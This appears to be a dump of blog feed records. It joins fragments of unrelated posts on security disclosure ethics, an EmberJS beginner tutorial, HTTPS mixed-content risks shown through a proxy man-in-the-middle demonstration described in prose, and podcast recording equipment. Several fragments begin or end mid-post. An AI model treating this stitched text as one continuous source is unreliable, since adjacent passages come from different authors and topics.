visibility public disclosure creates and there is also no arguing that it expedites the remediation process on behalf of the site owner. Partly this is due to the increased likelihood of the risk being exploited and partly it’s because in the face of public naming and shaming, the site owner is somewhat compelled to respond.</p><p>The other thing that tends to happen when a risk is made public is that the one lone voice that was the discloser suddenly becomes a chorus of like-minded individuals. For example,<a href=\"https://twitter.com/UKTesco/status/229542141012107265\">this tweet</a>has now been RT’d over 2,100 times and as you’ll see from the responses, generated an awful lot of noise about the woeful state of Tesco’s security. You can’t ignore that sort of pressure (certainly<a href=\"http://www.itpro.co.uk/642391/ico-to-investigate-tesco-over-website-security-concerns\">the ICO didn’t</a>) and without doubt it increases the pressure on an organisation to address their security.</p><h4>Moving forward</h4><p>I hope this gives some insight into my personal view of disclosure, I wouldn’t have approached Black and Decker any differently (it doesn’t satisfy rule 2 on victim impact) and likewise I wouldn’t have approached Westfield any differently (the results speak for themselves). Sometimes<a href=\"https://twitter.com/zimzat/status/328996255537696768\">people will have views that differ</a>but frankly, if I can satisfy those measures I’ve described above then I can sleep at night with confidence that on balance, security on the web has benefited.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/fhxbf8LPLU8\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1145}}

Some are easier than others. This time, it's Ember's turn.</p><p><img src='http://wekeroad.com/images/ember_get_started.png'/></p><p><h2>A Bit Steep</h2><p>I figured it's about time to get constructive in terms of getting to know EmberJS. The only reason I haven't up until this point is that I've been very busy with<a href=\"http://tekpub.com/productions/angular\">Tekpub's Angular production</a>.</p><p>So, today's the day. Let's get started.</p><h2>Baby Steps</h2><p>Getting Ember setup is frustrating.<a href=\"http://emberjs.com/guides/\">The Ember guides</a>are focused heavily on concept, not utility. For instance - getting Ember to load (for the uninitiated) is a matter of refreshing until the errors go away. I'll save you that time :).</p><p>Kick open a console (if you're on Linux/Mac) or crack open VS/WebMatrix if you're on a Windows machine. We want a bare application here so let's start by creating a directory:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span></pre></td><td class='code'><pre><code class=''><span class='line'>mkdir hello-ember</span><span class='line'>cd hello-ember</span></code></pre></td></tr></table></div></figure><p>Now we're in our directory. Let's create the pages/directories we'll need:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span></pre></td><td class='code'><pre><code class=''><span class='line'>mkdir js</span><span class='line'>touch index.html</span></code></pre></td></tr></table></div></figure><p>The next step is to get the scripts we'll need. We'll need 3:</p><ul><li>jQuery</li><li>Handlebars</li><li>Ember</li></ul><p>Ember won't work unless you have all three of these. I like to use the jQuery CDN at Google, but you'll need to<a href=\"https://raw.github.com/emberjs/ember.js/release-builds/ember-1.0.0-rc.1.js\">download Ember directly</a>and also<a href=\"https://raw.github.com/wycats/handlebars.js/1.0.0-rc.3/dist/handlebars.js\">Handlebars</a>. Put these files in your<code>js</code>directory.</p><p>Be sure to use the unminified version for development. This goes for any library you're learning - the unminified versions are easy to traverse if you have a debugger, and they typically have helpful debug statements built in.</p><p>Save these files in your<code>js</code>directory.</p><p>Let's add one more file where our application code will go:</p><figure class='code'><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class=''><span class='line'>touch js/app.js</span></code></pre></td></tr></table></div></figure><p>Open up the index.html page and stub out our skeleton, with the script references in place:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"cp\">&lt;!DOCTYPE html&gt;</span></span><span class='line'><span class=\"nt\">&lt;html</span><span class=\"na\">lang=</span><span class=\"s\">\"en\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"nt\">&lt;head&gt;</span></span><span class='line'><span class=\"nt\">&lt;title&gt;</span>Hello Ember<span class=\"nt\">&lt;/title&gt;</span></span><span class='line'><span class=\"nt\">&lt;/head&gt;</span></span><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;h1&gt;</span>Hello Ember<span class=\"nt\">&lt;/h1&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">src=</span><span class=\"s\">\"http://ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/handlebars.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/ember.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/javascript\"</span><span class=\"na\">src=</span><span class=\"s\">\"js/app.js\"</span><span class=\"nt\">&gt;&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/html&gt;</span></span></code></pre></td></tr></table></div></figure><p>Let's run this:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='html'><span class='line'>python -m SimpleHTTPServer</span></code></pre></td></tr></table></div></figure><p>Things should be cycling<a href=\"http://localhost:8000\">on port 8000</a>. If you're on Windows, just hit F5.</p><p>Now let's write some Ember code.</p><h2>Step 1: The Application View</h2><p>Up front: there's a lot of magic that happens behind the scenes with Ember. Just about any tutorial you read will spend 75% of the time explaining the concepts behind Ember, and 25% of the time on actually using it.</p><p>This can be daunting for people who\"want to get a feel\" (like me) and don't like sitting through conceptual lectures. I like to write code to understand a tool - so let's do that and I'll explain what I know along the way.</p><p>Open up js/app.js and create the Ember application:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span></code></pre></td></tr></table></div></figure><p>We have an application, which is a lovely start. We need at least two more things before we know that Ember is even alive and running:</p><ul><li>a View</li><li>a Controller</li></ul><p>The simplest view to create is the overall application view - let's add that to our HTML page, removing the first-level headers:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>This script tag is a Handlebars template. If you don't know what that is: it's just like an ERB template in Rails (or a Razor template in ASP.NET MVC) except it works with Javascript on the client.</p><p>Handlebars is pretty simple to use, and Ember extends some of its functionality to make it work happily with the Ember bits.</p><p>We've identified this template using<code>data-template-name</code>as being the main application viewport. Let's stick something in it.</p><h2>Step 2: The Application Controller</h2><p>If you're familiar with Rails-style MVC, well... forget it. There are many flavors of MVC and we'll be working with Desktop/Smalltalk-80 style here. This confused me greatly, and I still don't know how I feel about it, but it doesn't matter. This is the way Ember works.</p><p>In short:<strong>Controllers in Ember convey data to your templates</strong>.</p><p>To see this let's create our first Controller. Open up app.js:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">ApplicationController</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Controller</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>If you've used Backbone before, this will look very odd. I should also mention that using the ApplicationController like this is not a good idea - I'll fix it in just a second.</p><p>Let's update the view so we can see our data:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h1</span><span class=\"o\">&gt;</span><span class=\"p\">{{</span><span class=\"nx\">greeting</span><span class=\"p\">}}</span><span class=\"o\">&lt;</span><span class=\"err\">/h1&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h3</span><span class=\"o\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">happyThought</span><span class=\"p\">}}</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"err\">/h3&gt;</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>If you're working in Chrome, make sure the console is open by using Cmd-Shift-I (or Ctrl-Shift-I in Windows). If you see any errors here, correct them. It's likely you might have a 404 reference to one of your script files, or you've put them in your page in the wrong order (use my code above for the right order).</p><p>If everything is working: refresh your page - you should see a nice, Wonka greeting.</p><h2>Step 3: Conventions</h2><p>Look back over what we've written. Nowhere did we state\"get this template and render it this way\". Instead, Ember used the name of our template and married it up with the name of our Controller - and it all<em>just worked</em>.</p><p>This is a key bit of understanding with Ember:<strong>Naming things properly is everything</strong>.</p><p>To see this, let's get out of working with our ApplicationController directly.</p><p>First, create a new Controller, we'll call it the\"IndexController\". Don't name it something else - IndexController is what shows by default:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">IndexController</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Controller</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>Now, let's update our view so that the application view doesn't have hard-coded values in it:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span></pre></td><td class='code'><pre><code class='html'><span class='line'><span class=\"nt\">&lt;body&gt;</span></span><span class='line'><span class=\"nt\">&lt;div&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"application\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">outlet</span><span class=\"p\">}}</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;script</span><span class=\"na\">type=</span><span class=\"s\">\"text/x-handlebars\"</span><span class=\"na\">data-template-name=</span><span class=\"s\">\"index\"</span><span class=\"nt\">&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h1</span><span class=\"o\">&gt;</span><span class=\"p\">{{</span><span class=\"nx\">greeting</span><span class=\"p\">}}</span><span class=\"o\">&lt;</span><span class=\"err\">/h1&gt;</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"nx\">h3</span><span class=\"o\">&gt;</span></span><span class='line'><span class=\"p\">{{</span><span class=\"nx\">happyThought</span><span class=\"p\">}}</span></span><span class='line'><span class=\"o\">&lt;</span><span class=\"err\">/h3&gt;</span></span><span class='line'><span class=\"nt\">&lt;/script&gt;</span></span><span class='line'><span class=\"nt\">&lt;/div&gt;</span></span><span class='line'><span class=\"nt\">&lt;/body&gt;</span></span></code></pre></td></tr></table></div></figure><p>Refresh your page. You should see the same thing we saw before: a nice Wonka greeting. But what happened here?</p><p>Again: naming conventions at work. The ApplicationController is gone from our code, but it still exists\"behind the scenes\" as Ember created it for us. In the first example (where we worked directly with it) - you can think of that as\"overriding\" the ApplicationController.</p><p>The same goes with the IndexController. It was always there - but we didn't need it. In the second example we essentially\"overrode\" the IndexController and created a view for it.</p><p>The rendered view was then injected into the application view where<code>{{outlet}}</code>sits on the page. You can think of<code>{{outlet}}</code>in the same way that<code>yield</code>is used in Rails.</p><h2>Step 4: Models and Routing</h2><p>We've done some basic stuff here, let's explore the other parts of Ember. Once again, I'll keep it<strong>extremely simple</strong>.</p><p>In app.js, let's define a model. I'll do this by extending an Ember Object:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p><strong>Update</strong>- this code has been changed based on feedback from Tom Dale and comments below.</p><p>Now, let's define a Route. Routes in Ember help to link models to Controllers:</p><figure class='code'><figcaption><span></span></figcaption><div class=\"highlight\"><table><tr><td class=\"gutter\"><pre class=\"line-numbers\"><span class='line-number'>1</span><span class='line-number'>2</span><span class='line-number'>3</span><span class='line-number'>4</span><span class='line-number'>5</span><span class='line-number'>6</span><span class='line-number'>7</span><span class='line-number'>8</span><span class='line-number'>9</span><span class='line-number'>10</span><span class='line-number'>11</span><span class='line-number'>12</span><span class='line-number'>13</span><span class='line-number'>14</span><span class='line-number'>15</span></pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class=\"c1\">//our app</span></span><span class='line'><span class=\"kd\">var</span><span class=\"nx\">HelloEmber</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Application</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">({});</span></span><span class='line'></span><span class='line'><span class=\"c1\">//our model</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nb\">Object</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">greeting</span><span class=\"o\">:</span><span class=\"s2\">\"Good Morning Starshine!\"</span><span class=\"p\">,</span></span><span class='line'><span class=\"nx\">happyThought</span><span class=\"o\">:</span><span class=\"s2\">\"The Earth Says Hello!\"</span></span><span class='line'><span class=\"p\">});</span></span><span class='line'></span><span class='line'><span class=\"c1\">//our route</span></span><span class='line'><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">IndexRoute</span><span class=\"o\">=</span><span class=\"nx\">Ember</span><span class=\"p\">.</span><span class=\"nx\">Route</span><span class=\"p\">.</span><span class=\"nx\">extend</span><span class=\"p\">({</span></span><span class='line'><span class=\"nx\">model</span><span class=\"o\">:</span><span class=\"kd\">function</span><span class=\"p\">(){</span></span><span class='line'><span class=\"k\">return</span><span class=\"nx\">HelloEmber</span><span class=\"p\">.</span><span class=\"nx\">Greeting</span><span class=\"p\">.</span><span class=\"nx\">create</span><span class=\"p\">();</span></span><span class='line'><span class=\"p\">}</span></span><span class='line'><span class=\"p\">});</span></span></code></pre></td></tr></table></div></figure><p>This is all the code you should have in app.js. Notice how we have no Controller? We don't need one. This is confusing, but let's make sure things are working - refresh your page and you should see everything working just fine.</p><p>Assuming that it is - what we have here is naming magic at work, again. We've always had an IndexRoute (Ember created it for us since we didn't explicitly declare one) - but this time we wanted to specify a model so we needed to use a Route.</p><p>I mentioned that the Route exists to marry up a Controller to a Model,<strong>but we have no Controller!</strong>This can be maddening: we<em>do have a Controller</em>, we just didn't have to write the code for it: Ember did that for us.</p><p>The Controller that Ember created (the IndexController) was associated to our Route because we kept with the Ember naming magic.

The problem, as you’ll see in the video below, is that it jeopardises the security of traffic going backwards and forwards over what otherwise appears to be a secure site, at least in terms of implementing SSL. This can lead to issues such as the theft of identity data, potentially including such personal information as social security numbers. Fortunately there’s a channel to report potentially fraudulent activity except that, well, this video explains it best:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/CSmacMZ0xZo?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>Of course it’s ironic that it’s the Social Security Administration that’s made a bit of a botch of this but it’s an all too familiar scenario.<a href=\"http://www.troyhunt.com/2012/07/lessons-in-website-security-anti.html\">Tesco did it</a>,<a href=\"http://www.troyhunt.com/2013/05/why-i-am-worlds-greatest-lover-and.html\">so did Versa Lift</a>,<a href=\"http://www.troyhunt.com/2013/04/5-ways-to-implement-https-in.html\">so did Top CashBack</a>and a heap of others I haven’t previously written about. It’s rampant.</p><p>That’s the risk covered, let’s focus on the fixes and they’re all dead easy:</p><ol><li>Embed external content explicitly via the HTTPS scheme. If you’re only serving the page over HTTPS anyway then it ensures no slip ups.</li><li>Use a protocol relative URL or in other words, embed resources such as the jQuery file in the example above as //ajax.googleapis.com/… Yes, I know it looks weird but it works and it means when the page is loaded over HTTP then the resource will be requested over HTTP. Load the page over HTTPS and the resource embeds over HTTPS.</li><li>Test your damn web pages! No seriously, this is a fundamentally basic flaw and as soon as you load the page most browsers will start complaining. Have we – even us developers – become so desensitised to security warnings that we totally ignore them?!</li></ol><p>For the curious, as I mention in the video this demonstration was achieved by mounting a man in the middle attack at the proxy level. I used<a href=\"http://fiddler2.com/\">Fiddler</a>as the proxy and<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler Script</a>to modify the jQuery file in the OnBeforeResponse event. Whilst all this occurred within my PC, it demonstrates the alibility for it to happen at a proxy server anywhere – or at the internet gateway of your local cafe, or elsewhere in the ISP, or via a<a href=\"http://www.enigmacurry.com/category/diy/\">wiretap</a>on an enthernet cable or<a href=\"http://www.troyhunt.com/2013/04/the-beginners-guide-to-breaking-website.html\">as I’ve shown recently with the Pineapple</a>, via a rogue wireless access point the victim is connected to, possibly even without their knowledge.</p><p>Now as with my previous video on<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">the risk of loading login forms over HTTP</a>, many people will ask “Is this really a likely risk?” In fact that’s just<a href=\"https://twitter.com/paulswail/status/342836543855144960\">the discussion I had with Rob Conery</a>after the aforementioned post as even<a href=\"http://tekpub.com/\">TekPub</a>follows this pattern. I look at it like this: you implement SSL primarily because you’re concerned about the risk of someone intercepting your traffic. Assuming you acknowledge – and attempt to protect against – this risk, you accept that all the HTTP components of the communication remain vulnerable ergo you need to protect against the SSL anti-patterns mentioned here.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/pczeDYOJ1KU\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1154}}

The benefits are that there's no software to use. It's basically a recorded conference call. They handle call-ins for guests, archiving, delivery and bandwidth. However, it goes up from Free to $39 a month or more quickly.</p><p>If you are serious about the future of your podcast I recommend that you put a little more work into and and you'll have lots more control and flexibility.</p><h4>Good</h4><p>If you are going to do Skype-based recordings or online interviews, get yourself a decent USB microphone/headset. These are NOT audiophile or good quality headphones - to be clear - but they are good enough for Skype and they are<strong>guaranteed</strong>to sound better than talking in to your laptop's tiny microphone hole.</p><p>Remember, your laptop may have cost $1000 but that tinny microphone hole was only $1 of the price.

Ideally your guest will also have a good USB microphone.<strong>Even better if your guest records a local file while you also record the Skype call</strong>.

You can do interviews with these without carrying your laptop. You can also use your phone or tablet if you like. Ideally you'll want to make WAV files rather than MP3s. If you're editing your podcast later a WAV file will sound better while editing and won't lose quality. An MP3 is already compressed and then will get compressed again when you save your final podcast.</p><p>Consider a WAV file like a PNG, RAW file or BITMAP and an MP3 is like a JPEG. Edit in high quality files and export your final as a compressed MP3.S</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bitly.com/bwbpodcasting\"><img title=\"Sony Portable Recorder\"style=\"display: inline\"alt=\"Sony Portable Recorder\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_2641fdb8-8386-4bea-93d3-85ea453d50dc.png\"width=\"439\"height=\"329\"/></a></p><p>You can also add a small Lavalier (clip on) microphone if you like, then plug it into the portable recorder to better isolate sound for your interviews.</p><h4>Better++</h4><p>If you've got $80, consider a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.amazon.com/gp/product/B000PTF0E2/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B000PTF0E2&linkCode=as2&tag=diabeticbooks\">Samson C01UCW USB Mic or similar</a>. This is an extremely competent mic that plugs directly into your computer's USB port.

For one or two person talk shows this is a great mic to start with.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.amazon.com/gp/product/B000PTF0E2/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B000PTF0E2&linkCode=as2&tag=diabeticbooks\"><img title=\"Samson C01U\"style=\"display: inline\"alt=\"Samson C01U\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_248c5b8e-e4a9-4987-bdd8-d950f01bde3d.png\"width=\"438\"height=\"329\"/></a></p><p>Also consider your room configuration. If you have a square room with stone walls and wood floors, your listeners will be able to hear every bump in that echo-y environment. I use a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.realtraps.com/p_pvb.htm\">Portable Vocal Booth from RealTraps</a>when sound quality really counts. This is useful for screencasts and voice-over work in a noisy environment.</p><h4>Best</h4><p>I say\"best\" but I'm assuming you don't have an actual recording studio available to you. This is the setup that I use on<strong>all my podcasts</strong>. I use a<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/14PSZEO?r=bb\">Zoom H4N</a>portable recorder. It uses an SD card to store the WAV files. It comes with two small mics at the top for starters, but then lets you grow by adding either microphones with 1/4\" jacks or studio quality mics with XLR connectors.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bitly.com/bwbpodcasting\"><img title=\"Zoom H4n\"style=\"display: inline\"alt=\"Zoom H4n\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_fac66c62-7360-47f6-babc-a095a09728d6.png\"width=\"444\"height=\"329\"/></a></p><p>I recommend<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.amazon.com/gp/product/B0000AQRSR/ref=as_li_ss_tl?ie=UTF8&camp=1789&creative=390957&creativeASIN=B0000AQRSR&linkCode=as2&tag=diabeticbooks\">Shure microphones</a>.

All the very best episodes of<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.thisdeveloperslife.com\">This Developer's Life</a>were recorded like this. All the episodes of Hanselminutes where the guest wasn't on Skype were recorded in person with this very setup.</p><p>The Zoom also has the benefit of improving your YouTube videos. You can mount it directly to a DSLR camera with video capabilities and greatly augment the resulting video's sound quality. Again, the components in a DSLR are optimized for visuals, not audio.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bitly.com/bwbpodcasting\"><img title=\"Zoom H4n\"style=\"display: inline\"alt=\"Zoom H4n\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_22035b0d-c71c-42d7-87a5-3d9d4041c33d.png\"width=\"432\"height=\"329\"/></a></p><h3>Editing</h3><p>Luvvie and I live in different time zones so we record local files with our portable rigs PLUS we Skype each other and record the call with CallBurner. This gives me THREE files.</p><p><img title=\"Three files for one phone call\"style=\"display: inline\"alt=\"Three files for one phone call\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_bfa8eca5-ee7f-4c9f-9c50-df98544ebb75.png\"width=\"600\"height=\"350\"/></p><p>Why three files? Well, one high quality of my recorded locally as a WAV. One of my co-host recorded in high quality as a WAV and one of BOTH of us. The trick is that we<strong>don't use the phone/Skype track.</strong></p><p>The phone track is just for lining up the two other tracks. This makes it sound like my co-host and I are in the same room together. See the three files below. My co-host is on top - notice her track is quiet. I'm on the bottom. The phone track is in the middle. Since these are separate tracks I can adjust Luvvie's track to make it louder and better match my track's volume.</p><p>I move our tracks around using the phone/Skype track as a guide. It tells me what we're supposed to sound like and gets our conversation in Sync. When I feel we are in sync, I<strong>mute</strong>the Skype track and listen to us talk.</p><p><img title=\"Editing in Audacity\"style=\"display: inline\"alt=\"Editing in Audacity\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_b3a6ce1b-cddb-43a7-92ee-5f251b772376.png\"width=\"600\"height=\"450\"/></p><p>For complex show I'll use Adobe Audition and use the Effects Rack. I use a Speech Volume Leveler and a\"Hard Limiter\" to keep the voices at a strong, but not overpowering level. There are LOTS of great Tutorials online to show you how to use tools like Audacity and Audition.</p><p><img title=\"Editing in Adobe Audition\"style=\"display: inline\"alt=\"Editing in Adobe Audition\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_aee8e9e4-4330-43c1-b913-b4b9ca0f8531.png\"width=\"600\"height=\"544\"/></p><p>It's like PhotoShop for sound! There are layers and filters and effects. Thinking about it this way greatly helped my mental block.</p><h3>Publishing</h3><p>We recommend using<a 